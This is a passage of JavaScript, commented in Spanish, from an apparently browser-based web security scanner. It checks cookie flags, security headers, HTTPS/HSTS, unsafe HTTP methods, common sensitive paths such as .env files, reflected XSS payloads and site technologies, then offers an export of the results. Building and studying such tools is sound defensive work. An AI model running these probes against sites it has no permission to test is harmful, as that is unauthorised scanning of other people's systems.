                    results.vulnerabilities.push("Cookie sin flag Secure");
                }
                if (!cookie.includes('HttpOnly')) {
                    log("      [⚠] Falta flag HttpOnly");
                    results.vulnerabilities.push("Cookie sin flag HttpOnly");
                }
            });
        }

        // Detección de servidor
        if (results.headers['server']) {
            log(`\n[🖥 SERVER] ${results.headers['server']}`);
            // Aquí puedes agregar más análisis de versión
        }

        // Verificación de headers de seguridad
        log("\n[🔒 SECURITY HEADERS]");
        const missing = securityHeaders.filter(h => !results.headers[h.toLowerCase()]);
        if (missing.length) {
            log(`    [⚠] Faltan headers: ${missing.join(', ')}`);
            results.vulnerabilities.push(`Headers de seguridad faltantes: ${missing.join(', ')}`);
        }

    } catch (error) {
        log(`[!] Error al obtener encabezados: ${error.message}`);
    }

    // --- Verificación SSL/TLS ---
    log("\n[+] Verificando SSL/TLS...");
    if (baseUrl.startsWith('https://')) {
        log("    [🔐] HTTPS activado");
        
        try {
            const sslRes = await safeFetch(baseUrl);
            if (sslRes.error) throw new Error(sslRes.error);
            
            if (sslRes.ok) log("    [✅] Certificado SSL válido");
            
            if (!results.headers['strict-transport-security']) {
                log("    [⚠] HSTS no está habilitado");
                results.vulnerabilities.push("HSTS no habilitado");
            }
        } catch (error) {
            log(`    [⚠] Problema con SSL: ${error.message}`);
        }
    } else {
        log("    [⚠] El sitio no usa HTTPS");
        results.vulnerabilities.push("No usa HTTPS");
    }

    // --- Verificación de métodos HTTP ---
    log("\n[+] Probando métodos HTTP...");
    const enabledMethods = [];
    
    for (const method of unsafeMethods) {
        const res = await safeFetch(baseUrl, { method });
        if (res.status && res.status < 400) {
            enabledMethods.push(method);
            log(`    [⚠] Método ${method} permitido (${res.status})`);
            results.vulnerabilities.push(`Método ${method} permitido`);
        }
        await new Promise(resolve => setTimeout(resolve, 200)); // Delay entre peticiones
    }
    
    if (!enabledMethods.length) {
        log("    [✅] Solo métodos seguros permitidos");
    }

    // --- Fuzzing de rutas comunes ---
    log("\n[+] Escaneando rutas comunes...");
    
    for (const path of wordlist) {
        const url = baseUrl + path;
        const res = await safeFetch(url);
        
        if (res.status && res.status !== 404) {
            log(`    [${res.status}] ${url}`);
            results.foundPaths.push({ path, status: res.status, url });
            
            if (path.includes('.env') || path.includes('config')) {
                log("      [⚠] Archivo sensible encontrado");
                results.vulnerabilities.push(`Archivo sensible encontrado: ${path}`);
            }
        }
        
        await new Promise(resolve => setTimeout(resolve, 300)); // Delay más largo para fuzzing
    }

    // --- Pruebas XSS básicas ---
    log("\n[+] Probando vulnerabilidades XSS básicas...");
    for (const payload of xssPayloads) {
        const testUrl = baseUrl + '?test=' + encodeURIComponent(payload);
        const res = await safeFetch(testUrl);
        
        if (res.text && res.text.includes(payload.replace(/<\/?script>/g, ''))) {
            log(`    [⚠] Posible XSS reflejado en parámetro 'test'`);
            results.vulnerabilities.push(`Posible XSS con payload: ${payload}`);
            break; // Detener después de encontrar uno
        }
    }

    // --- Detección de tecnologías ---
    log("\n[+] Detectando tecnologías...");
    try {
        const res = await safeFetch(baseUrl);
        if (res.text) {
            frameworks.forEach(framework => {
                if (framework.pattern.test(res.text)) {
                    results.technologies.push(framework.name);
                }
            });
            
            if (results.technologies.length) {
                log(`    [⚙] Tecnologías detectadas: ${results.technologies.join(', ')}`);
            }
        }
    } catch (error) {
        log(`    [!] Error al detectar tecnologías: ${error.message}`);
    }

    // --- Resumen final ---
    log("\n[📊 RESUMEN FINAL]");
    log(`    URL escaneada: ${baseUrl}`);
    log(`    Tecnologías detectadas: ${results.technologies.length ? results.technologies.join(', ') : 'Ninguna'}`);
    log(`    Rutas encontradas: ${results.foundPaths.length}`);
    log(`    Problemas de seguridad encontrados: ${results.vulnerabilities.length}`);
    
    if (results.vulnerabilities.length) {
        log("\n[⚠] VULNERABILIDADES:");
        results.vulnerabilities.forEach(v => log(`    - ${v}`));
    } else {
        log("\n[✅] No se encontraron vulnerabilidades críticas");
    }

    log("\n[✓] Escaneo completado");
    
    // Restaurar botón
    scanButton.disabled = false;
    scanButton.textContent = "Iniciar Escaneo";
    
    // Agregar botón de exportación
    addExportButton(output.textContent);
}

function addExportButton(content) {
    const outputDiv = document.getElementById("output");
    if (document.getElementById("exportBtn")) return;

    const exportBtn = document.createElement("button");
    exportBtn.id = "exportBtn";
    exportBtn.textContent = "Exportar Resultados";
    exportBtn.style.marginTop = "10px";
    exportBtn.style.padding = "8px 16px";
    exportBtn.style.backgroundColor = "#4CAF50";
    exportBtn.style.color = "white";
    exportBtn.style.border = "none";
    exportBtn.style.borderRadius = "4px";
    exportBtn.style.cursor = "pointer";

    exportBtn.onclick = function() {
        const blob = new Blob([content], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "scan_results.txt";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    outputDiv.appendChild(exportBtn);
}
